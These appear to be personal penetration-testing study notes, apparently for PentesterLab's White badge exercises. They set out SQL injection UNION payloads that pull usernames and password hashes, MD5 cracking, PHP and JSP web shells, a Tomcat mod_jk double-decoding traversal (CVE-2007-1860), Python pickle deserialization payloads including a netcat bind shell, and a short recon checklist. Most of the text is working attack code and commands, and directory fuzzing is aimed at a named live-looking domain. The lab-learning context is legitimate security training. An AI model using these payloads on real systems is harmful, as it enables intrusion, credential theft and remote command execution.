## PTL White Random Notes

#### From SQL Injection to Shell

- telnet vulnerable 80

```
GET / HTTP/1.1
Host: vulnerable 
```

- openssl s_client -connect vulnerable:443
- Burp suite proxy

- sudo apt update
- sudo apt install python3-pip
- sudo apt install libcurl4-openssl-dev libssl-dev
- pip install wfuzz
- vim .bashrc
- export PATH="/home/goenix/.local/bin:$PATH"
- wfuzz -c -z file,wordlist/general/big.txt --hc 404 https://pelotascore.com/FUZZ
- wfuzz -z file -f commons.txt --hc 404 http:pelotascore.com/FUZZ.php

- ORDER BY 3
- /cat.php?id=2+union+select+1,2,3,4--
- Oracle: UNION SELECT null,null,null FROM dual
- Other DBs: Oracle: UNION SELECT null,null,null
- /cat.php?id=2+union+select+id,login,password,id+from+users--

- /cat.php?id=1%20UNION%20SELECT%201,@@version,3,4
- /cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4
- /cat.php?id=1%20UNION%20SELECT%201,database(),3,4

- /cat.php?id=1%20UNION%20SELECT%201,concat(table_name,':',column_name),3,4%20FROM%20information_schema.columns
- /cat.php?id=1%20UNION%20SELECT%201,concat(login,':',password),3,4%20FROM%20users

- admin:8efe310f9ab3efeae8d410a8e0166eb2 => Search engine to crack the MD5 password =>admin:P4ssw0rd
- John The Ripper => $ ./john password --format=raw-md5  --wordlist=dico --rules

- Upload a web shell =>

```
<?php
  system($_GET['cmd']);
?>
```

- /admin/uploads/shell.php3?c=cat /etc/passwd

##### CVE-2007-1860: mod_jk double-decoding

- /examples/jsp/%252e%252e/%252e%252e/manager/html

###### index.jsp
```
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

- jar -cvf ../webshell.war *
- Select WAR file to upload and take care of the double-encoding trick in the uplaod form
- Pay attention to tomcat CSRF protection/cookies

#### Pickle Code Execution

- sudo apt install python2
- ls /usr/bin/python*
- sudo update-alternatives --list python

###### hack.py
```
import cPickle
class Hack:
  def __init__(self):
    self.test1 = "test"  
    self.test2 = "retest"  
 
h = Hack()
print cPickle.dumps(h)
```

- python2 hack.py

###### blah.py
```
import cPickle
class Blah(object):
  def __reduce__(self):
    return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
b = Blah()
print cPickle.dumps(b)
```

- python2 blah.py | base64
 
###### score.py
```
import cPickle
class Blah(object):
  def __reduce__(self):
    return (os.system,("/usr/local/bin/score 39c0b5b5-3dab-4d9b-a685-27503157e66f",))
b = Blah()
print cPickle.dumps(b)
```

- python2 score.py | base64
- on windows => ubprocess with __import__
- Always concentrate more on custom code!
 
1. root domains dump them to a public repos
2. find every possible subdomain amass sublister
3. LiveTargetFinder massdns masscann nmap  
4. Wayback machine tomnomnom 






